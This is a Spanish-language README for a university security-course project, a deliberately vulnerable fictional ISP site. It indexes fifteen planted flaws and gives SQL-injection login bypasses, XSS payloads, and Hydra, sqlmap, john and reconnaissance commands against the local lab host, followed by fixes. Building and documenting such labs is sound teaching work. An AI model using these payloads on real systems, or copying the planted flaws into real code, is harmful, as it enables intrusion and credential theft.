# 🛡️ NuevaTel — Proyecto Seguridad
## Índice de Vulnerabilidades Intencionales

**Materia:** Seguridad Informática — EMI Bolivia  
**Empresa ficticia:** NuevaTel S.R.L. (ISP residencial)  
**Stack:** HTML5 / CSS3 / PHP 7.2 / MySQL 5.7 / Apache 2.4.49  

---

## 📂 Estructura del proyecto

```
nuevatel/
├── index.html          ← Página principal (vulns #1, #2, #3, #4, #5, #6)
├── login.html          ← Portal de clientes (vuln #7, #8)
├── contacto.html       ← Formulario de contacto (vuln #3)
├── css/
│   └── style.css
├── js/
│   └── main.js         ← (vuln #15: API keys expuestas)
├── php/
│   └── auth.php        ← Backend login (vulns #7–#12)
├── admin/
│   └── index.html      ← Panel admin (vulns #4, #13, #14)
└── backup/
    └── nuevatel_db_backup_*.sql  ← (vuln #5: backup expuesto)
```

---

## 🔴 Tabla de vulnerabilidades

| # | Tipo | Ubicación | Severidad | Herramienta para detectar |
|---|------|-----------|-----------|--------------------------|
| 1 | Headers de seguridad faltantes (X-Frame-Options, CSP, HSTS) | index.html `<head>` | Media | nikto, OWASP ZAP |
| 2 | XSS Reflejado — parámetro `zona` sin sanitizar | index.html sección cobertura | Alta | OWASP ZAP, Burp Suite |
| 3 | CSRF — formularios sin token CSRF | contacto.html, index.html | Alta | OWASP ZAP, Burp Suite |
| 4 | Panel admin sin autenticación (Broken Access Control) | /admin/ | Crítica | nmap, dirb, nikto |
| 5 | Directorio /backup/ expuesto con dump SQL | /backup/ | Crítica | dirb, gobuster |
| 6 | Versión de servidor expuesta en comentario HTML | index.html footer | Baja | nikto, curl |
| 7 | SQL Injection en login | php/auth.php | Crítica | sqlmap, Burp Suite |
| 8 | Contraseñas hasheadas con MD5 sin salt | php/auth.php, BD | Alta | John the Ripper, Hashcat |
| 9 | Errores SQL expuestos al usuario | php/auth.php | Media | nikto, pruebas manuales |
| 10 | Cookies de sesión sin HttpOnly/Secure | php/auth.php | Alta | OWASP ZAP, Burp Suite |
| 11 | Sin rate limiting (fuerza bruta posible) | php/auth.php | Alta | Hydra |
| 12 | Credenciales BD hardcodeadas en código | php/auth.php | Crítica | grep, revisión código |
| 13 | XSS Reflejado en panel admin | admin/index.html | Alta | OWASP ZAP, Burp Suite |
| 14 | Contraseñas visibles en panel admin | admin/index.html | Crítica | Acceso directo |
| 15 | API keys y secretos en JavaScript público | js/main.js | Alta | Burp Suite, DevTools |

---

## 🧪 Cómo explotar cada vulnerabilidad

### VULN #7 — SQL Injection en login
```
URL: http://nuevatel.local/login.html
Usuario: admin' --
Password: cualquier_cosa

O también:
Usuario: ' OR '1'='1' --
Password: x
```

### VULN #2 y #13 — XSS Reflejado
```
URL: http://nuevatel.local/index.html?zona=<script>alert('XSS NuevaTel')</script>
URL: http://nuevatel.local/admin/?buscar=<img src=x onerror=alert(document.cookie)>
```

### VULN #4 — Admin sin auth
```
Acceso directo: http://nuevatel.local/admin/
Sin credenciales, sin sesión activa.
```

### VULN #5 — Backup expuesto
```
URL: http://nuevatel.local/backup/nuevatel_db_backup_2025-01-15.sql
Contiene: usuarios, contraseñas, datos de clientes, credenciales SMTP
```

### VULN #11 — Fuerza bruta con Hydra
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt nuevatel.local http-post-form \
  "/php/auth.php:usuario=^USER^&password=^PASS^:incorrectos"
```

---

## 🔧 Remediaciones sugeridas (para el PDCA)

| # | Remediación |
|---|-------------|
| 1 | Agregar headers: `X-Frame-Options: DENY`, `Content-Security-Policy`, `Strict-Transport-Security` |
| 2,13 | Sanitizar con `htmlspecialchars()` todo input antes de mostrarlo |
| 3 | Implementar token CSRF con `bin2hex(random_bytes(32))` en cada formulario |
| 4 | Agregar verificación de sesión + rol en cada página del admin |
| 5 | Bloquear acceso a /backup/ via .htaccess o moverlo fuera del webroot |
| 6 | Desactivar `ServerTokens` y `ServerSignature` en Apache |
| 7 | Usar PDO con prepared statements: `$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE usuario=?")` |
| 8 | Usar `password_hash()` con bcrypt y `password_verify()` |
| 9 | Desactivar `display_errors` en producción, usar logs internos |
| 10 | `session_set_cookie_params(['httponly'=>true,'secure'=>true,'samesite'=>'Strict'])` |
| 11 | Implementar rate limiting con contador de intentos en sesión o Redis |
| 12 | Mover credenciales a variables de entorno o archivo `.env` fuera del webroot |
| 14,15 | Nunca mostrar datos sensibles en frontend; mover lógica al backend |

---

## 🛠️ Herramientas para el escaneo

```bash
# Reconocimiento
nmap -sV -sC -p 80,443,3306,22 nuevatel.local
nikto -h http://nuevatel.local
dirb http://nuevatel.local /usr/share/dirb/wordlists/common.txt
gobuster dir -u http://nuevatel.local -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Análisis web
owasp-zap                          # GUI: escaneo activo completo
sqlmap -u "http://nuevatel.local/php/auth.php" --data="usuario=a&password=b" --dbs

# Ataques
hydra -l admin -P rockyou.txt nuevatel.local http-post-form "/php/auth.php:..."
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

---

*Proyecto académico — Seguridad Informática — EMI Bolivia 2025*
